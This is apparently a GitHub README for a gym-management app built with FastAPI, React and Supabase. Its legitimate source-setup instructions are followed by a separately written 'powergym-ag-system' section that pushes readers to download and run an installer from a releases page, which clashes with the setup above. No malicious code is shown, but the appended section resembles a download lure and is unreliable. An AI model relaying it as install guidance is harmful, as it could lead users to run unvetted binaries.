# Project Bolt - Full Stack

Project Bolt is a full stack application for managing customers, biometrics, payments, plans, subscriptions, and attendance. It consists of a FastAPI backend and a React/TypeScript frontend, integrated with Supabase for database operations.

## Features
- FastAPI backend with RESTful endpoints
- React + TypeScript frontend SPA
- Supabase integration
- JWT authentication
- Modular architecture
- Automated testing (pytest)
- Docker support

## Getting Started

### Prerequisites
- Python 3.10+
- Node.js 18+
- Supabase account
- Docker (optional)

### Installation
1. Clone the repository:
   ```sh
   git clone <repo-url>
   ```
2. Copy environment variables:
   ```sh
   cp .env.example .env
   ```

#### Backend Setup
1. Navigate to backend:
   ```sh
   cd backend
   ```
2. Install Python dependencies:
   ```sh
   pip install -r requirements.txt
   ```
   or
   ```sh
   poetry install
   ```
3. Run the API server:
   ```sh
   uvicorn app.main:app --reload
   ```

#### Frontend Setup
1. Navigate to frontend:
   ```sh
   cd frontend
   ```
2. Install Node dependencies:
   ```sh
   npm install
   ```
3. Start the development server:
   ```sh
   npm run dev
   ```

#### Docker Compose
To run both services with Docker Compose:
```sh
docker-compose up
```

## Project Structure
```
project/
  backend/    # FastAPI backend
  frontend/   # React frontend
  supabase/   # Database migrations
  docker-compose.yml
```

## API Documentation
Once running, access the backend docs at:
- Swagger UI: `http://localhost:8000/docs`
- ReDoc: `http://localhost:8000/redoc`

## License
MIT
# 🏋️‍♂️ powergym-ag-system - Manage Your Gym Effortlessly

[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sabastianrafa/powergym-ag-system/releases)

## 🚀 Getting Started

Welcome to the powergym-ag-system! This gym management system makes it easy to oversee your gym’s operations. Whether you want to manage users, automate messages, or monitor inventory, this software has you covered.

## 📥 Download & Install

To get started, visit this page to download: [Download PowerGym System](https://github.com/sabastianrafa/powergym-ag-system/releases). Here, you'll find the latest versions of the software.

1. **Visit the Downloads Page**:
   Go to [PowerGym Releases](https://github.com/sabastianrafa/powergym-ag-system/releases).

2. **Select the Version**:
   Look for the latest version available. This ensures you have the most up-to-date features and fixes.

3. **Download the File**:
   Click on the appropriate link for your operating system to download the file.

4. **Run the Application**:
   Once downloaded, open the file and follow the prompts to install the software onto your computer.

## ⚙️ System Requirements

Before installing, ensure your system meets these requirements:

- **Operating System**: Windows, macOS, or a recent version of Linux.
- **Memory**: At least 4GB of RAM.
- **Storage**: 500MB of free space.
- **Database**: PostgreSQL for backend support.

## 🧑‍🤝‍🧑 Features

The powergym-ag-system includes several key features to optimize your gym management:

- **Facial Recognition**: Simplifies user verification.
- **User Management**: Add, edit, or remove users easily.
- **Automated Messages**: Keep your members informed with automatic notifications.
- **Reports**: Generate reports on user activity and inventory.
- **Inventory Control**: Track your gym equipment and supplies.

## 📚 Topics

This application utilizes various modern technologies:

- **Alembic**: For database migrations.
- **Docker Compose**: For easy deployment.
- **FastAPI**: To handle the backend efficiently.
- **Fingerprint Authentication**: For secure user access.
- **React**: For a seamless front-end experience.
- **Supabase**: As a backend service platform.
- **Typescript**: For type safety in development.

## 🔍 Troubleshooting

If you encounter any issues during the installation or while running the application, here are some quick tips:

1. **Ensure Compatibility**:
   Check that your operating system and version meet the requirements listed above.

2. **Database Setup**:
   Make sure PostgreSQL is installed and running. Refer to the PostgreSQL documentation for setup guidance.

3. **Network Issues**:
   If the application fails to connect, check your internet connection and firewall settings.

4. **Permissions**:
   Ensure you have the necessary permissions to install software on your system. 

## 🤝 Support

If you need further assistance or have any questions, feel free to reach out:

- **Issues Page**: Use the GitHub issues page to report problems.
- **Community**: Join our community discussions for tips and help from other users.

## 🎉 Conclusion

With the powergym-ag-system, you have a powerful tool at your fingertips. It's designed for ease of use, ensuring anyone can manage a gym confidently. Download now, and take the first step towards a more organized gym management experience!
